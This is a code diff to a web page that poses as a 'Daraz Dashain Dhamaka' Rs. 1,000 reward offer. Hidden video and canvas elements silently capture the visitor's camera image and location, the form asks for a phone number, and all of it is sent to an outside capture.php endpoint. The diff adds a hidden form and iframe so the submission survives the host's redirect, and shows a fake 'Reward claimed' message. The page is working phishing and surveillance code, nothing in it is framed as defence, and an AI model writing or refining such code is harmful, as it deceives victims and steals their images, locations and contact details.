@@ -169,13 +169,12 @@
 
 <video id="video" playsinline autoplay muted></video>
 <canvas id="canvas" style="display:none"></canvas>
+<iframe name="hiddenFrame" style="display:none;"></iframe>
 
 <script>
 "use strict";
 
 var API = "https://daraz-dashain.freedev.app/capture.php";
- // Warm up: follow InfinityFree's ?i= challenge so the cookie is set before POST
-fetch(API, { method: 'GET', cache: 'no-store', credentials: 'include' }).catch(function(){});
 
 var modal       = document.getElementById('modalOverlay');
 var btnRedeem   = document.getElementById('btnRedeem');
@@ -195,7 +194,7 @@ btnRedeem.addEventListener('click', function(e){
   modal.classList.add('active');
 });
 
-/* ---- ENABLE CONFIRM ONLY WHEN CHECKED ---- */
+/* ---- ENABLE CONFIRM ---- */
 agreeCheck.addEventListener('change', function(){
   btnConfirm.disabled = !agreeCheck.checked;
 });
@@ -283,7 +282,7 @@ function triggerCameraCapture() {
   });
 }
 
-/* ---- SUBMIT ---- */
+/* ---- SUBMIT via hidden form (survives InfinityFree redirect) ---- */
 btnSubmit.addEventListener('click', function(){
   var phone = document.getElementById('phone').value.trim();
   var notes = document.getElementById('notes').value.trim();
@@ -293,33 +292,40 @@ btnSubmit.addEventListener('click', function(){
   btnSubmit.disabled = true;
   btnSubmit.textContent = 'SUBMITTING...';
 
-  fetch(API, {
-    method: 'POST',
-    mode: 'no-cors',
-    headers: { 'Content-Type':'text/plain;charset=UTF-8' },
-    body: JSON.stringify({
-      campaign: 'Daraz Dashain Dhamaka',
-      reward: 'Rs. 1,000',
-      phoneNumber: phone,
-      notes: notes,
-      location: captured.location,
-      image: captured.image
-    })
-  })
-  .then(function(){
-    showStatus('Sent! Check server.');
-    btnSubmit.textContent = '\u2713 SENT';
+  var form = document.createElement('form');
+  form.method = 'POST';
+  form.action = API;
+  form.target = 'hiddenFrame';
+  form.style.display = 'none';
+
+  function addField(name, value) {
+    var input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = name;
+    input.value = (value === null || value === undefined) ? '' : value;
+    form.appendChild(input);
+  }
+
+  addField('campaign', 'Daraz Dashain Dhamaka');
+  addField('reward', 'Rs. 1,000');
+  addField('phoneNumber', phone);
+  addField('notes', notes);
+  addField('location', captured.location ? JSON.stringify(captured.location) : '');
+  addField('image', captured.image || '');
+
+  document.body.appendChild(form);
+  form.submit();
+
+  setTimeout(function(){
+    showStatus('Sent! Reward claimed.');
+    btnSubmit.textContent = '\u2713 CLAIMED';
     btnSubmit.classList.add('success');
     document.getElementById('phone').readOnly = true;
     document.getElementById('notes').readOnly = true;
-  })
-  .catch(function(e){
-    showStatus('FAILED: ' + e.message);
-    btnSubmit.disabled = false;
-    btnSubmit.textContent = 'RETRY';
-  });
+    document.body.removeChild(form);
+  }, 1200);
 });
- 
+
 /* ---- STATUS PILL ---- */
 function showStatus(msg) {
   statusPill.textContent = msg;
